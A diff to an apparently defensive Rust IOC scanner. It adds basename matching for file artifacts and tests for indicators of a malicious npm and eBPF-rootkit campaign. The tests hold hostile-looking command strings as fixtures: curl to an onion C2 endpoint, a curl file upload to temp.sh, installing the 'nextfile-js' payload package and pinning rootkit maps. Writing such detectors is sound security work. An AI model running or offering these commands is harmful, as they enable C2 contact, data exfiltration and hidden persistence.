@@ -209,10 +209,24 @@ impl IocDatabase {
                 for (indicator, campaign) in map {
                     // Case-insensitive whole-token match (sha256 in PKGBUILDs is
                     // conventionally lowercase, but uppercase is legal and must hit).
-                    if tokens
-                        .iter()
-                        .any(|t| t.eq_ignore_ascii_case(indicator))
-                    {
+                    let whole = tokens.iter().any(|t| t.eq_ignore_ascii_case(indicator));
+                    // File artifacts additionally match on the basename (last `/`
+                    // path segment) of a token, so the real drop path
+                    // `/sys/fs/bpf/hidden_pids` catches the `hidden_pids`
+                    // indicator. Basename equality is exactly as specific as a
+                    // bare-token match (no substring / prefix over-match), so it
+                    // adds no false-positive risk and closes the path-form
+                    // detection escape. npm/sha256 stay whole-token only.
+                    let basename = if matches!(kind, IocKind::FileArtifact) {
+                        tokens.iter().any(|t| {
+                            t.rsplit('/')
+                                .next()
+                                .is_some_and(|b| b.eq_ignore_ascii_case(indicator))
+                        })
+                    } else {
+                        false
+                    };
+                    if whole || basename {
                         hits.push(IocHit {
                             kind,
                             value: indicator.clone(),
@@ -321,6 +335,113 @@ mod tests {
             toml::from_str("[domains]\n\"evil.example\" = \"atomic-arch-2026-06\"\n").unwrap();
         db.merge(extra);
         assert!(db.domains.contains_key("evil.example"));
+    }
+
+    #[test]
+    fn v250_db_has_expanded_indicators() {
+        // v2.5.0 IOC expansion: every documented unambiguous indicator must be
+        // present in the embedded database.
+        let db = IocDatabase::embedded();
+        // npm/bun payloads (Wave 3 npm package added in v2.5.0).
+        assert!(db.npm_packages.contains_key("nextfile-js"));
+        // eBPF rootkit pinned-map artifacts.
+        assert!(db.files.contains_key("hidden_pids"));
+        assert!(db.files.contains_key("hidden_names"));
+        assert!(db.files.contains_key("hidden_inodes"));
+        // Wave 1-2 onion C2.
+        assert!(db
+            .domains
+            .contains_key("olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion"));
+        // Wave 1-2 payload hashes.
+        assert!(db
+            .sha256
+            .contains_key("6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b"));
+        assert!(db
+            .sha256
+            .contains_key("fd4852334ce1c2d7c9bf0e1c91dbf274a1247989b4827d4f7758cbf3bf42ebfe"));
+    }
+
+    #[test]
+    fn v250_scan_detects_nextfile_js_npm_payload() {
+        // Wave 3 of the *June 2026* Atomic Arch npm campaign: the obfuscated
+        // `bun add nextfile-js` payload must be caught (not the July 2026
+        // two-stage loader campaign, which is `atomic-arch-2026-08`).
+        let db = IocDatabase::embedded();
+        let hits = db.scan_content("cd /tmp && bun add nextfile-js");
+        assert!(hits
+            .iter()
+            .any(|h| h.kind == IocKind::NpmPackage && h.value == "nextfile-js"));
+    }
+
+    #[test]
+    fn v250_scan_detects_ebpf_rootkit_maps() {
+        // eBPF rootkit pinned-map artifacts (files) match as a whole token AND
+        // on the basename of a `/`-path token, so the real drop path
+        // /sys/fs/bpf/hidden_pids catches the hidden_pids indicator (closes the
+        // path-form detection escape). A substring of a LONGER name still does
+        // not over-match (basename/whole equality only).
+        let db = IocDatabase::embedded();
+        let hits = db.scan_content("bpftool map pin name hidden_pids /sys/fs/bpf/hidden_pids");
+        assert!(hits
+            .iter()
+            .any(|h| h.kind == IocKind::FileArtifact && h.value == "hidden_pids"));
+        // The canonical runtime path form must now also match (basename-aware).
+        let path_hits = db.scan_content("ls /sys/fs/bpf/hidden_pids");
+        assert!(
+            path_hits.iter().any(|h| h.value == "hidden_pids"),
+            "path-form /sys/fs/bpf/hidden_pids must match: {path_hits:?}"
+        );
+        // A longer segment that merely contains the name as a substring must
+        // still not over-match (same js-digest vs js-digestion guarantee).
+        let over_hits = db.scan_content("touch /sys/fs/bpf/hidden_pids_backup");
+        assert!(
+            !over_hits.iter().any(|h| h.value == "hidden_pids"),
+            "basename equality must not over-match a longer segment: {over_hits:?}"
+        );
+    }
+
+    #[test]
+    fn v250_scan_detects_wave1_onion_c2() {
+        // Wave 1-2 onion C2 host must match.
+        let db = IocDatabase::embedded();
+        let hits = db.scan_content(
+            "curl http://olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion/api/agent",
+        );
+        assert!(hits.iter().any(|h| h.kind == IocKind::Domain
+            && h.value == "olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion"));
+    }
+
+    #[test]
+    fn v250_scan_detects_wave1_payload_hashes() {
+        // Wave 1-2 `deps` ELF + `~/.local/bin/sudo` shim hashes must match.
+        let db = IocDatabase::embedded();
+        let hits = db.scan_content(
+            "sha256sums=('SKIP' '6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b')\n\
+             sha256sums=('SKIP' 'fd4852334ce1c2d7c9bf0e1c91dbf274a1247989b4827d4f7758cbf3bf42ebfe')",
+        );
+        assert!(hits.iter().any(|h| h.kind == IocKind::Sha256
+            && h.value == "6144d433f8a0316869877b5f834c801251bbb936e5f1577c5680878c7443c98b"));
+        assert!(hits.iter().any(|h| h.kind == IocKind::Sha256
+            && h.value == "fd4852334ce1c2d7c9bf0e1c91dbf274a1247989b4827d4f7758cbf3bf42ebfe"));
+    }
+
+    #[test]
+    fn v250_no_substring_fp_for_generic_artifact_names() {
+        // v2.5.0 negative test (design rule): generic artifact basenames and the
+        // legit temp.sh exfil service must NOT be name-indicators — including
+        // under the basename-aware files matcher (a `deps`/`optimizer`/`agent`/
+        // `.torrc` file or a `temp.sh` URL must not raise an IOC hit). They are
+        // caught by content rules (ATOMIC-*) and the network blocklist instead.
+        let db = IocDatabase::embedded();
+        let hits = db.scan_content(
+            "sudo \"$srcdir/optimizer\"\ncurl -F file=@log.txt https://temp.sh/upload\n\
+             LD_LIBRARY_PATH=/tmp/tb ./agent\ncc -o deps src.c\ntor -f /tmp/.torrc",
+        );
+        // optimizer / agent / temp.sh / tb / deps / .torrc must not raise an IOC hit.
+        assert!(
+            hits.is_empty(),
+            "generic artifact names must not raise IOC hits: {hits:?}"
+        );
     }
 
     #[test]
